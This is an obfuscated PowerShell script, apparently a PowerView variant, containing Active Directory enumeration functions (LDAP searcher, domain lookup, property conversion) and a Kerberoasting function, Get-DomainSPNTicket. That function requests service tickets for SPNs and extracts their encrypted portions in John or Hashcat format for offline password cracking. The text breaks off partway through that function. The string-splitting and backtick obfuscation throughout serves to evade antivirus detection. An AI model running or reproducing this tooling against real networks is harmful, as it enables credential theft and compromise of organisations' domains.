 &("{0}{2}{1}" -f'SEt-V','RiaBLE','A')  v3A4E  ( [tyPE]("{4}{11}{1}{9}{2}{6}{3}{8}{10}{5}{7}{0}" -f'iON','RectO','ER','eS','sYSTem','CHaSIngOp','Vic','T','.RefErra','Rys','L','.dI')  )  ;${E`LXB`4S}= [TYpE]("{3}{5}{6}{0}{4}{2}{1}"-f't','S','Ices.SecuriTYMaSk','SYSTem.','orYseRv','dIr','EC') ;   ${v`wE}=[TyPE]("{2}{0}{1}" -f 'ATeTIM','e','D'); &("{1}{0}"-f 't','se')  6l3IO  (  [TypE]("{5}{4}{2}{0}{1}{3}" -F 'D','iNgFLA','IoN.bIn','gs','CT','sySTEM.reFlE')  )  ;   ${gj`5t4V}=  [TYPe]("{1}{10}{8}{6}{5}{0}{4}{7}{2}{11}{3}{9}" -f'VEd','SYS','t','.dO','IRE','.AcTi','VIceS','c','EM.dIRectorySEr','MaIn','t','Ory'); ${H`V6} =  [TYPE]("{5}{3}{1}{2}{0}{4}"-f 'iO','e','Ct','L','n.AssemBLy','ref')  ;    &("{2}{1}{0}" -f't-ITEm','E','s')  VaRiAble:fitRv ([TypE]("{4}{2}{1}{0}{3}{5}"-F'TCon','bI','.','v','System','erteR')); ${R`E5`A04} =[TYPE]("{2}{0}{1}" -f'O','NVERt','C')  ;   ${59`Fh} =  [TYpE]("{1}{2}{0}{3}"-F'RTE','b','ITconVe','R') ;   &("{2}{1}{0}"-f'TeM','i','set-') ("vArIabL"+"e:rO"+"4a") ( [TYpE]("{1}{0}"-F'uM','En') );  &("{0}{1}" -f'S','Et')  ("AW"+"k") ( [typE]("{5}{1}{2}{4}{6}{0}{7}{3}"-f 's','GEME','N','eNTIAL','t.autom','mANa','atIOn.P','creD') ); 

function geT`-`dOmaInseArch`eR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}{3}"-f 'roce','s','PSShouldP','s'}, '')]
    [OutputType({"{5}{7}{6}{3}{1}{2}{8}{0}{4}{10}{9}{11}"-f'rvices','or','yS','t','.DirectorySear','Sys','ec','tem.Dir','e','h','c','er'})]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFroMpIpElINe = ${tR`UE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`M`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'ter','Fil'})]
        [String]
        ${LD`ApfILt`er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Pr`o`peRTies},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f 'at','h','ADSP'})]
        [String]
        ${SE`Ar`chBAsE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${S`eA`RCH`BASEPR`efix},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}" -f'D','omainControlle','r'})]
        [String]
        ${s`Erv`ER},

        [ValidateSet({"{1}{0}"-f'e','Bas'}, {"{0}{1}" -f'OneL','evel'}, {"{1}{2}{0}" -f 'ee','S','ubtr'})]
        [String]
        ${sea`RCHS`cO`pe} = ("{0}{1}{2}" -f'Su','btr','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`e`s`ULtPAGESize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seRVERT`iMe`Li`M`IT} = 120,

        [ValidateSet({"{1}{0}"-f'cl','Da'}, {"{1}{0}"-f'up','Gro'}, {"{1}{0}" -f 'one','N'}, {"{1}{0}" -f 'wner','O'}, {"{1}{0}" -f 'l','Sac'})]
        [String]
        ${SEcu`Rity`mAS`ks},

        [Switch]
        ${To`M`BsTONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`ReD`ENt`Ial} =  (&("{0}{2}{1}"-f 'G','DiteM','et-chIl') ('VarI'+'A'+'bLE:a'+'Wk') )."Va`lue"::"EMP`Ty"
    )

    PROCESS {
        if (${Ps`BoU`ND`paRam`EtERS}[("{1}{0}" -f'omain','D')]) {
            ${tarG`e`TDOMA`in} = ${D`omaIn}
        }
        else {
            
            if (${p`sBOundpAr`Am`EteRS}[("{1}{2}{0}" -f'al','Cr','edenti')]) {
                ${doMa`ino`BJe`CT} = &("{1}{0}{2}" -f'et-Dom','G','ain') -Credential ${cr`Ed`E`NTial}
            }
            else {
                ${DOmAI`NoBj`ECT} = &("{0}{1}{2}" -f 'Ge','t-Do','main')
            }
            ${TA`RG`eTD`OmA`In} = ${Do`mA`I`NoBJECt}."N`AME"
        }

        if (-not ${P`SB`oUNdpARAMET`ERS}[("{0}{2}{1}" -f'S','rver','e')]) {
            
            try {
                if (${dom`Ainob`JEct}) {
                    ${b`In`D`Server} = ${dOmAiNo`B`jEct}."PdC`Ro`le`owNeR"."NA`ME"
                }
                elseif (${pSb`ounD`p`ArAmeT`e`RS}[("{3}{2}{0}{1}" -f 'dentia','l','re','C')]) {
                    ${b`iNDsE`RvEr} = ((&("{1}{0}{2}"-f'et-Domai','G','n') -Credential ${C`Rede`NtI`AL})."pd`cRO`lEow`NER")."NA`Me"
                }
                else {
                    ${BINDsE`Rv`eR} = ((&("{0}{1}{2}"-f 'G','et-Domai','n'))."pdcroleOW`N`ER")."n`Ame"
                }
            }
            catch {
                throw ('[G'+'et'+'-'+'Do'+'mainSear'+'cher] '+'Er'+'ror '+'i'+'n '+'re'+'triev'+'in'+'g '+'PDC'+' '+'for'+' '+'c'+'urren'+'t '+'domai'+'n: '+"$_")
            }
        }
        else {
            ${BI`NdseR`VER} = ${s`Er`VeR}
        }

        ${S`EAr`CH`Str`ING} = ("{0}{1}"-f'LD','AP://')

        if (${BInDSE`R`V`er} -and (${BIN`dser`VEr}.("{0}{1}" -f 'Tri','m').Invoke() -ne '')) {
            ${searc`hsT`RIng} += ${bIN`Ds`erver}
            if (${tA`R`GETDomAin}) {
                ${SeA`Rc`HS`T`RInG} += '/'
            }
        }

        if (${PsBOu`N`dPA`RAmetERs}[("{3}{2}{4}{1}{0}"-f'efix','sePr','r','Sea','chBa')]) {
            ${s`e`A`RchS`TrinG} += ${SEA`R`chBas`EPrefix} + ','
        }

        if (${PSboun`d`pAram`e`TErs}[("{3}{2}{0}{1}" -f 'as','e','B','Search')]) {
            if (${se`A`RCHBASE} -Match ("{0}{1}"-f '^G','C://')) {
                
                ${D`N} = ${sE`AR`C`hbaSe}.("{0}{1}" -f 'ToUppe','r').Invoke().("{0}{1}" -f'Tri','m').Invoke('/')
                ${SearchS`Tri`Ng} = ''
            }
            else {
                if (${s`EAr`chBase} -match ("{2}{0}{1}" -f 'DAP:','//','^L')) {
                    if (${Sea`RcH`B`Ase} -match ("{1}{2}{0}" -f '://.+/.+','LDA','P')) {
                        ${sE`Ar`C`Hstr`Ing} = ''
                        ${d`N} = ${sEaR`Ch`B`Ase}
                    }
                    else {
                        ${DN} = ${SeAr`CH`BASe}.("{2}{0}{1}" -f 'r','ing','SubSt').Invoke(7)
                    }
                }
                else {
                    ${dN} = ${s`EaRc`HBa`SE}
                }
            }
        }
        else {
            
            if (${T`ArGE`TdOmaIN} -and (${Ta`R`ge`Td`omaIN}.("{0}{1}" -f 'Tri','m').Invoke() -ne '')) {
                ${dN} = "DC=$($TargetDomain.Replace('.', ',DC='))"
            }
        }

        ${sEArc`HSTR`inG} += ${d`N}
        &("{0}{2}{1}"-f'W','bose','rite-Ver') ('[Get'+'-Do'+'mai'+'nSearc'+'her] '+'se'+'arc'+'h '+'st'+'ring'+': '+"$SearchString")

        if (${CrEd`ENT`iaL} -ne   ${A`wk}::"Emp`Ty") {
            &("{2}{1}{0}"-f'se','-Verbo','Write') ("{4}{7}{3}{0}{6}{2}{1}{8}{11}{10}{5}{9}"-f'rcher','ed','ternate cr','mainSea','[G','c','] Using al','et-Do','enti','onnection','P ','als for LDA')
            
            ${dOmA`i`N`OBjeCT} = &("{0}{1}{2}{3}" -f 'N','ew-O','bj','ect') ("{0}{2}{3}{6}{5}{1}{7}{4}"-f 'Direc','or','to','ryS','ntry','rvices.Direct','e','yE')(${S`E`ArcH`STrInG}, ${cR`eD`en`TIAL}."Us`ERnA`me", ${C`REDE`NTI`AL}.("{2}{1}{3}{0}"-f'edential','etNetwor','G','kCr').Invoke()."pa`s`swoRD")
            ${S`EArChER} = &("{1}{3}{2}{0}"-f'bject','N','-O','ew') ("{8}{5}{4}{7}{3}{9}{0}{1}{6}{10}{2}" -f'r','vices','archer','ryS','m.Dire','yste','.Di','cto','S','e','rectorySe')(${D`om`AIn`oBjEcT})
        }
        else {
            
            ${SE`Ar`cheR} = &("{1}{2}{0}" -f 'ect','Ne','w-Obj') ("{9}{4}{0}{7}{5}{1}{2}{6}{8}{3}"-f 't','ce','s.Direct','cher','.Direc','vi','o','orySer','rySear','System')([ADSI]${SEARC`H`stri`Ng})
        }

        ${sE`Archer}."PA`GeSIzE" = ${r`e`sUltpagEsI`ze}
        ${seAr`c`hER}."seA`RcHS`CoPE" = ${SeaRchs`cO`PE}
        ${s`EAr`ch`Er}."CA`c`HereSu`lTs" = ${FaL`Se}
        ${SEA`R`CHER}."r`Ef`eRRalCH`Asing" =  (&("{1}{0}" -f'EM','ChIlDit') VariABlE:V3A4E)."v`AlUE"::"A`Ll"

        if (${pSBOUn`DpAr`Ame`TERs}[("{1}{3}{0}{2}"-f 'i','S','t','erverTimeLim')]) {
            ${s`ear`CHER}."S`ErVeRT`IMELI`MIt" = ${s`erVER`TIM`E`LiMit}
        }

        if (${PsBO`U`Nd`PaRam`eTeRS}[("{1}{0}{2}" -f's','Tomb','tone')]) {
            ${SE`Ar`C`heR}."ToM`BsT`OnE" = ${t`RUE}
        }

        if (${pS`BouN`DPa`Ra`m`eTErs}[("{1}{0}{2}{3}"-f 'A','LD','PFi','lter')]) {
            ${sea`RC`hEr}."fI`L`TER" = ${lDA`pFil`TER}
        }

        if (${PsB`oUnDparAM`E`T`ERs}[("{2}{1}{3}{0}" -f 'tyMasks','e','S','curi')]) {
            ${sea`R`c`hER}."SeCUri`TYmA`skS" = Switch (${sECur`iT`YM`Asks}) {
                ("{0}{1}"-f 'Dac','l') {  ( &("{2}{1}{0}{3}"-f 'L','et-vARIAb','g','e') elXb4S  -va)::"dA`CL" }
                ("{1}{0}"-f'up','Gro') {  (  &("{0}{1}"-f'g','Ci')  ('VaRIABL'+'e'+':'+'e'+'Lxb4S') )."vA`lue"::"Gr`OuP" }
                ("{1}{0}" -f 'one','N') {  ${E`LX`B4s}::"nO`NE" }
                ("{0}{1}"-f 'Own','er') {  ${ELx`B4S}::"oW`NER" }
                ("{0}{1}" -f 'Sac','l') {   ${El`xB`4s}::"Sa`cl" }
            }
        }

        if (${pSBoU`N`DPar`AmeT`eRS}[("{0}{2}{1}" -f'Pr','rties','ope')]) {
            
            ${prOPE`Rti`ESTO`LOaD} = ${PrOP`Erti`Es}| &("{2}{0}{1}" -f'rEach','-Object','Fo') { ${_}.("{1}{0}"-f'plit','S').Invoke(',') }
            ${NU`Ll} = ${Se`A`RCher}."PrOpeRT`I`est`OL`OAD".("{1}{0}{2}" -f'd','Ad','Range').Invoke((${pRo`p`ER`TieSt`oLoad}))
        }

        ${SeaRC`h`er}
    }
}


function Co`N`Ve`Rt-lD`ApprOpe`Rty {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{0}{1}{2}{3}" -f 'SSh','oul','dProces','s','P'}, '')]
    [OutputType({"{9}{11}{8}{1}{3}{10}{7}{0}{6}{2}{4}{5}" -f'tio','anagement.A','u','u','stomO','bject','n.PSC','ma','M','Sy','to','stem.'})]
    [CmdletBinding()]
    Param(
        [Parameter(MANdATOrY = ${t`Rue}, vALUEfromPIpeLInE = ${Tr`Ue})]
        [ValidateNotNullOrEmpty()]
        ${p`Ropert`iEs}
    )

    ${O`BJe`C`Tp`RoPerTiES} = @{}

    ${p`RoPeR`TI`ES}."p`R`OpeR`TYnaMes" | &("{2}{1}{0}{3}{4}"-f 'rEach-Ob','o','F','je','ct') {
        if (${_} -ne ("{1}{0}{2}" -f's','ad','path')) {
            if ((${_} -eq ("{2}{0}{1}"-f'ctsi','d','obje')) -or (${_} -eq ("{1}{2}{0}" -f'istory','si','dh'))) {
                
                ${oBJ`E`CT`pROpe`RtIeS}[${_}] = ${pr`op`erTieS}[${_}] | &("{3}{2}{0}{1}{4}"-f'ch-Ob','jec','a','ForE','t') { (&("{2}{0}{1}"-f'-O','bject','New') ("{11}{9}{5}{2}{1}{4}{3}{7}{6}{0}{10}{8}" -f 'd','.P','ity','ci','rin','r','rityI','pal.Secu','ntifier','ecu','e','System.S')(${_}, 0))."VA`Lue" }
            }
            elseif (${_} -eq ("{2}{1}{0}" -f'e','yp','groupt')) {
                ${ObjECtpropE`RT`i`ES}[${_}] = ${pr`opEr`TIES}[${_}][0] -as ${gR`OUp`Ty`pEenuM}
            }
            elseif (${_} -eq ("{0}{2}{3}{1}" -f 'samaccou','ype','nt','t')) {
                ${oBJecT`p`ROP`ERTIES}[${_}] = ${pr`o`pe`RTIEs}[${_}][0] -as ${sAMAc`COUNTt`yP`EE`N`Um}
            }
            elseif (${_} -eq ("{0}{2}{1}"-f'ob','d','jectgui')) {
                
                ${o`BJec`TP`Rop`erTIeS}[${_}] = (&("{0}{2}{1}{3}" -f'N','-O','ew','bject') ("{1}{0}" -f'uid','G') (,${P`Ro`PErTiEs}[${_}][0]))."Gu`ID"
            }
            elseif (${_} -eq ("{4}{2}{0}{3}{1}" -f 'rac','l','se','countcontro','u')) {
                ${OBjEc`TPRO`Pe`Rties}[${_}] = ${pR`O`PErti`es}[${_}][0] -as ${U`Ac`EnUM}
            }
            elseif (${_} -eq ("{2}{3}{1}{4}{0}{5}" -f'uritydescrip','e','n','ts','c','tor')) {
                
                ${dE`ScrIp`T`Or} = &("{2}{0}{1}" -f'-Ob','ject','New') ("{5}{6}{4}{3}{0}{7}{8}{2}{1}"-f 'l.RawS','criptor','tyDes','ntro','o','Security.Acces','sC','e','curi') -ArgumentList ${pr`o`pertieS}[${_}][0], 0
                if (${desc`R`IpToR}."o`WnER") {
                    ${oBj`ECtpr`OpertI`eS}[("{0}{1}"-f 'O','wner')] = ${De`Sc`RipTOR}."oWn`ER"
                }
                if (${deS`c`RipT`Or}."grO`Up") {
                    ${O`BJEctp`RoPE`RtiES}[("{0}{1}"-f'Gro','up')] = ${desc`R`iPt`oR}."gRO`UP"
                }
                if (${DE`sc`R`ipToR}."Di`sC`RE`TioNAryACL") {
                    ${Obj`eC`TP`ROP`erTIES}[("{1}{0}{3}{2}" -f 'retion','Disc','Acl','ary')] = ${DEs`Cr`iPt`OR}."dI`S`C`RE`TiONarYACl"
                }
                if (${D`ESC`R`IptOr}."sY`stEmACL") {
                    ${oBjeCtP`R`o`P`ERties}[("{1}{0}" -f 'Acl','System')] = ${D`e`ScrIPtor}."S`yst`EmaCL"
                }
            }
            elseif (${_} -eq ("{1}{0}{3}{4}{2}"-f 'untexp','acco','es','i','r')) {
                if (${PR`oper`T`IEs}[${_}][0] -gt   (&("{1}{0}{2}" -f'b','VariA','LE') VwE  )."val`Ue"::"ma`X`ValUE"."t`ICKS") {
                    ${Obje`cT`pR`Ope`RtiEs}[${_}] = ("{0}{1}" -f'NEVE','R')
                }
                else {
                    ${ObjEcTp`RO`PErt`IES}[${_}] =   (  &("{0}{2}{1}"-f'V','lE','ArIab') ('Vw'+'E') )."vAL`UE"::"f`ROmFILEtI`mE"(${pr`oPe`R`TieS}[${_}][0])
                }
            }
            elseif ( (${_} -eq ("{1}{0}{2}" -f 'og','lastl','on')) -or (${_} -eq ("{2}{3}{1}{0}"-f 'ontimestamp','log','la','st')) -or (${_} -eq ("{0}{2}{1}"-f'pwdla','set','st')) -or (${_} -eq ("{1}{0}{2}"-f 'gof','lastlo','f')) -or (${_} -eq ("{0}{4}{2}{3}{1}" -f'badP','me','sword','Ti','as')) ) {
                
                if (${pROpE`R`Ti`es}[${_}][0] -is [System.MarshalByRefObject]) {
                    
                    ${T`EmP} = ${p`R`Op`eRTIES}[${_}][0]
                    [Int32]${hi`gh} = ${t`eMp}.("{0}{1}" -f'G','etType').Invoke().("{0}{2}{1}{3}"-f 'In','em','vokeM','ber').Invoke(("{0}{2}{1}"-f'Hi','t','ghPar'),   ${6`l3iO}::"g`eTPro`PerTY", ${N`ULl}, ${T`eMP}, ${N`Ull})
                    [Int32]${l`oW}  = ${TE`Mp}.("{0}{1}{2}" -f'G','etTy','pe').Invoke().("{1}{2}{0}{3}"-f 'e','Invoke','Memb','r').Invoke(("{1}{2}{0}" -f 't','Low','Par'),   (  &('lS')  vArIaBLE:6L3io  )."vA`LuE"::"get`pRo`PERty", ${Nu`Ll}, ${T`EMp}, ${NU`LL})
                    ${obj`ectP`RoPe`RtiEs}[${_}] = ( ${v`WE}::"FRoMf`i`letIMe"([Int64]("0x{0:x8}{1:x8}" -f ${HI`gh}, ${L`OW})))
                }
                else {
                    
                    ${OBJeCTp`Ro`p`eRtIEs}[${_}] = (  ( &("{1}{0}{2}"-f'aR','v','IABlE') ("VW"+"e")  -VALU)::"FROM`F`iLETi`Me"((${PR`op`e`RTies}[${_}][0])))
                }
            }
            elseif (${P`ROPERt`iEs}[${_}][0] -is [System.MarshalByRefObject]) {
                
                ${p`RoP} = ${pr`OpERti`ES}[${_}]
                try {
                    ${T`EMp} = ${pR`oP}[${_}][0]
                    [Int32]${h`IGH} = ${Te`mP}.("{2}{1}{0}"-f'pe','etTy','G').Invoke().("{1}{2}{0}"-f'mber','Inv','okeMe').Invoke(("{2}{0}{1}" -f'ighP','art','H'),   ${6`L3`Io}::"g`e`TPropeRtY", ${nu`ll}, ${T`emp}, ${nU`ll})
                    [Int32]${L`Ow}  = ${T`emP}.("{1}{0}"-f 'etType','G').Invoke().("{1}{2}{0}" -f 'er','Inv','okeMemb').Invoke(("{1}{2}{0}" -f 'wPart','L','o'),   ( &("{1}{0}" -f 'EM','it')  VARiABLe:6l3IO)."Va`luE"::"getPrO`pER`Ty", ${N`UlL}, ${te`Mp}, ${N`Ull})
                    ${obj`eCt`pROpERT`iES}[${_}] = [Int64]("0x{0:x8}{1:x8}" -f ${H`IGH}, ${L`Ow})
                }
                catch {
                    &("{2}{3}{0}{1}"-f'-Verbo','se','Wr','ite') ('[Conv'+'er'+'t-LDAPProp'+'er'+'t'+'y] '+'err'+'or: '+"$_")
                    ${objEct`pr`OpeR`TIES}[${_}] = ${PR`OP}[${_}]
                }
            }
            elseif (${pRo`pe`RtiEs}[${_}]."CO`UNT" -eq 1) {
                ${obje`Ct`PR`OpErT`i`es}[${_}] = ${Pr`opE`RtIeS}[${_}][0]
            }
            else {
                ${OBj`ec`T`PrOPERTiES}[${_}] = ${P`R`o`pERtIES}[${_}]
            }
        }
    }
    try {
        &("{1}{0}{2}"-f'w-Ob','Ne','ject') -TypeName ("{1}{2}{0}"-f't','PSObje','c') -Property ${O`BjeCTP`ROpE`RTIES}
    }
    catch {
        &("{3}{0}{1}{2}" -f'-War','nin','g','Write') ('['+'C'+'o'+'nver'+'t-L'+'DAPP'+'roperty'+'] '+'Er'+'ro'+'r '+'par'+'s'+'ing '+'LDA'+'P '+'prop'+'ert'+'ies '+': '+"$_")
    }
}


function Get-`dOM`AIn {


    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(pOsitiON = 0, valuEfRoMpIPElIne = ${tR`Ue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`M`AiN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`E`De`Ntial} =   (  &('LS')  ("vArIaB"+"L"+"e:"+"aWk") )."vaL`Ue"::"em`ptY"
    )

    PROCESS {
        if (${p`SboUn`DPA`RamE`TERS}[("{0}{3}{1}{2}" -f'C','ti','al','reden')]) {

            &("{2}{1}{0}" -f'e','rite-Verbos','W') ("{8}{11}{7}{13}{1}{4}{5}{3}{10}{2}{12}{6}{0}{9}" -f'or G','g alter','ede',' ','nat','e','als f','ma','[Ge','et-Domain','cr','t-Do','nti','in] Usin')

            if (${PSBOuNDp`A`RAMETe`RS}[("{0}{1}"-f 'Domai','n')]) {
                ${tARGe`TdO`m`AiN} = ${DOm`A`In}
            }
            else {
                
                ${tArg`Et`D`OMAIn} = ${C`Rede`NT`IaL}.("{4}{2}{0}{1}{5}{3}" -f'kCre','denti','twor','l','GetNe','a').Invoke()."do`M`Ain"
                &("{0}{1}{2}"-f 'Write-Ve','rbos','e') ('[Ge'+'t-Domai'+'n'+'] '+'Extrac'+'t'+'ed '+'dom'+'ai'+'n '+"'$TargetDomain' "+'f'+'rom '+'-Cr'+'e'+'den'+'tial')
            }

            ${doM`A`iNCoNt`E`Xt} = &("{0}{2}{1}"-f 'Ne','ect','w-Obj') ("{13}{3}{9}{2}{15}{0}{5}{6}{12}{11}{14}{16}{4}{1}{17}{10}{7}{8}"-f'i','ory.D','m','s','t','re','ctoryServ','t','ext','te','yCon','ActiveDi','ices.','Sy','r','.D','ec','irector')(("{1}{0}" -f'in','Doma'), ${T`Ar`GETdoma`In}, ${C`RED`ENtIal}."U`SERName", ${CR`EDEnti`AL}.("{0}{1}{2}{3}" -f 'GetN','e','tworkC','redential').Invoke()."p`A`ssWord")

            try {
                  ${gj`5`T4V}::("{1}{0}{2}" -f 't','Ge','Domain').Invoke(${dOM`Ai`N`cOntext})
            }
            catch {
                &("{0}{3}{4}{2}{1}"-f'W','e','os','rite','-Verb') ('['+'Get-D'+'omain'+'] '+'Th'+'e '+'spe'+'c'+'ified '+'do'+'main'+' '+"'$TargetDomain' "+'doe'+'s '+'no'+'t '+'ex'+'ist,'+' '+'cou'+'ld'+' '+'not'+' '+'b'+'e '+'co'+'ntacted,'+' '+'th'+'ere'+' '+('is'+'n{0}t'+' ')-F[ChAR]39+'an'+' '+'existi'+'ng'+' '+'trust'+', '+'or'+' '+'the'+' '+'s'+'peci'+'fied '+'creden'+'t'+'ials'+' '+'ar'+'e '+'in'+'v'+'alid: '+"$_")
            }
        }
        elseif (${psB`Oun`DPARa`MEt`e`Rs}[("{0}{1}" -f 'D','omain')]) {
            ${D`OMai`Nc`Ont`exT} = &("{3}{2}{1}{0}" -f'ct','e','w-Obj','Ne') ("{2}{7}{6}{12}{14}{13}{3}{15}{4}{0}{11}{10}{9}{1}{16}{8}{5}"-f'veD','.D','Sys','r','i','yContext','m','te','ctor','ctory','re','i','.Di','ectorySe','r','vices.Act','ire')(("{1}{0}" -f'ain','Dom'), ${DO`mAin})
            try {
                 (  &("{1}{2}{0}"-f'E','Va','RIAbl') GJ5T4V -vAlUe)::("{0}{1}"-f'G','etDomain').Invoke(${DOMAi`N`c`On`TeXT})
            }
            catch {
                &("{1}{0}{2}{3}" -f 'rbo','Write-Ve','s','e') ('[G'+'et-'+'Domain]'+' '+'T'+'he '+'speci'+'fie'+'d '+'dom'+'a'+'in '+"'$Domain' "+'do'+'es '+'not'+' '+'ex'+'ist,'+' '+'cou'+'ld'+' '+'n'+'ot '+'be'+' '+'c'+'ontac'+'ted, '+'or'+' '+'the'+'re'+' '+(('isnV'+'4'+'St ') -rEplacE([cHAR]86+[cHAR]52+[cHAR]83),[cHAR]39)+'an'+' '+'e'+'xisting'+' '+'tr'+'ust'+' '+': '+"$_")
            }
        }
        else {
            try {
                 ( &("{1}{0}" -f'em','It') ("v"+"A"+"RiaBLE:G"+"j5t4V")  )."VAl`UE"::("{2}{3}{1}{0}"-f 'ntDomain','rre','G','etCu').Invoke()
            }
            catch {
                &("{2}{0}{1}"-f 'e-','Verbose','Writ') ('['+'Ge'+'t-Domain] '+'E'+'r'+'ror '+'retriev'+'in'+'g'+' '+'the'+' '+'cur'+'rent'+' '+'domain:'+' '+"$_")
            }
        }
    }
}



function Get`-DomAi`N`SPN`TIcKet {


    [OutputType({"{2}{0}{3}{1}"-f'.SPNT','et','PowerView','ick'})]
    [CmdletBinding(DeFAUlTPaRAMETerseTname = {"{1}{0}" -f'wSPN','Ra'})]
    Param (
        [Parameter(pOSITIon = 0, PaRAmEterSEtnAmE = "ra`wspn", manDATORY = ${t`RUE}, VAlUeFRoMpIPELiNe = ${TR`UE})]
        [ValidatePattern({"{1}{0}" -f '/.*','.*'})]
        [Alias({"{4}{6}{2}{0}{1}{3}{5}" -f 'r','incipal','viceP','Na','S','me','er'})]
        [String[]]
        ${s`pn},

        [Parameter(PoSItIoN = 0, PARAMEtersetNAME = "u`SeR", maNDAtOrY = ${TR`Ue}, valuEFrOMpiPElinE = ${t`RUE})]
        [ValidateScript({ ${_}."ps`o`BjECt"."T`Yp`enAmes"[0] -eq ("{2}{3}{0}{1}" -f's','er','PowerV','iew.U') })]
        [Object[]]
        ${u`SeR},

        [ValidateSet({"{0}{1}" -f 'Joh','n'}, {"{2}{0}{1}"-f 'hca','t','Has'})]
        [Alias({"{2}{1}{0}"-f't','ma','For'})]
        [String]
        ${oU`T`PUTF`orm`At} = ("{0}{1}"-f'J','ohn'),

        [ValidateRange(0,10000)]
        [Int]
        ${d`e`LaY} = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        ${jIt`T`eR} = .3,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cre`deN`TiaL} =  (&("{2}{1}{0}" -f'E','BL','gEt-vaRIa') awk  )."VAL`Ue"::"eMP`TY"
    )

    BEGIN {
        ${n`ULL} =  ( &("{0}{1}"-f 'gc','i')  VARIAbLe:hv6  )."v`AlUe"::("{3}{1}{2}{0}" -f 'me','ithPa','rtialNa','LoadW').Invoke(("{3}{1}{0}{2}{4}" -f'IdentityMo','m.','de','Syste','l'))

        if (${PSb`o`UNdpARAM`e`T`ERS}[("{0}{1}{2}"-f 'Credent','ia','l')]) {
            ${l`oGoNTO`ken} = &("{2}{3}{4}{1}{0}" -f 'n','tio','Invoke-U','s','erImpersona') -Credential ${C`R`EDEnt`iAl}
        }
    }

    PROCESS {
        if (${P`Sboun`DpA`RAME`TerS}[("{1}{0}"-f 'r','Use')]) {
            ${T`Arg`e`TobjEcT} = ${us`ER}
        }
        else {
            ${tAr`G`E`TOb`jeCt} = ${S`pn}
        }
	
	${RA`NdNo} = &("{3}{2}{1}{0}" -f '-Object','w','e','N') ("{4}{1}{3}{0}{2}" -f'ando','.','m','R','System')

        ForEach (${oBj`E`cT} in ${taRg`E`T`oBJ`eCt}) {

            if (${P`sBOuNDpaR`A`Me`TE`RS}[("{0}{1}" -f 'U','ser')]) {
                ${useR`S`Pn} = ${oBjE`cT}."serVICePrI`NcI`pA`LNaMe"
                ${SAmacC`OUn`TnaMe} = ${OB`J`ECT}."samA`Cc`OU`N`TNAme"
                ${dIsTI`Ng`UIsHED`N`A`ME} = ${oB`jeCT}."Dis`Tin`GuIS`He`dnA`me"
            }
            else {
                ${u`s`erSpn} = ${ob`jE`cT}
                ${SamaCc`Ou`Nt`NA`me} = ("{1}{0}" -f 'NOWN','UNK')
                ${D`iS`TIngu`iSHEdn`AmE} = ("{1}{2}{0}" -f 'NOWN','UN','K')
            }

            
            if (${US`e`RSpn} -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                ${USe`Rs`pn} = ${u`SEr`sPN}[0]
            }

            try {
                ${TIc`K`et} = &("{3}{1}{0}{2}" -f'ec','ew-Obj','t','N') ("{8}{10}{13}{1}{12}{5}{0}{2}{6}{7}{9}{3}{4}{11}"-f'ens.Ke','ityMode','rbero','tyTo','ke','ok','sReques','torSec','System','uri','.Ide','n','l.T','nt') -ArgumentList ${USE`RS`pn}
            }
            catch {
                &("{0}{1}{2}"-f 'Wri','te-Warnin','g') ('[Get-Domain'+'SPN'+'Tic'+'ket'+'] '+'Err'+'or '+'req'+'u'+'es'+'ting '+'ti'+'cket '+'f'+'or '+'SPN'+' '+"'$UserSPN' "+'fro'+'m '+'us'+'er '+"'$DistinguishedName' "+': '+"$_")
            }
            if (${tIC`K`Et}) {
                ${tiCk`etby`TEs`Tr`eam} = ${tI`CkET}.("{1}{0}{2}" -f'etReque','G','st').Invoke()
            }
            if (${TICK`eTbytes`TR`eAM}) {
                ${O`Ut} = &("{0}{2}{1}" -f'N','-Object','ew') ("{1}{2}{0}" -f 't','PSO','bjec')

                ${TICKEthe`XS`TrE`AM} =  (&("{1}{0}{3}{2}"-f'-VaRiAB','gEt','E','l')  fItrv -vaL )::("{2}{0}{1}"-f 'oStrin','g','T').Invoke(${tiC`K`etbY`T`eStr`EAm}) -replace '-'

                
                
                if(${t`i`Ckethe`x`sT`REaM} -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    ${E`Ty`Pe} =   (  &("{1}{0}" -f'cI','g') ("V"+"AriABLE"+":r"+"e5a04") )."Va`LUe"::("{1}{0}" -f'Byte','To').Invoke( ${MAtc`Hes}."e`TyPEL`EN", 16 )
                    ${Ci`pher`Te`xtLeN} =  (&("{0}{1}{2}" -f'vARI','aB','Le') ("R"+"E5"+"a04"))."v`Alue"::("{2}{0}{1}"-f 'UInt3','2','To').Invoke(${mAt`c`hES}."ciP`heRTex`Tl`EN", 16)-4
                    ${c`Ip`herT`exT} = ${MaT`cH`ES}."d`At`ATOenD".("{3}{0}{1}{2}"-f 'r','i','ng','Subst').Invoke(0,${C`Ip`HErte`xT`Len}*2)

                    
                    if(${MaTC`HEs}."d`AT`Atoend".("{0}{2}{1}" -f'Subst','ing','r').Invoke(${cIPHe`R`TExtl`EN}*2, 4) -ne ("{0}{1}"-f'A4','82')) {
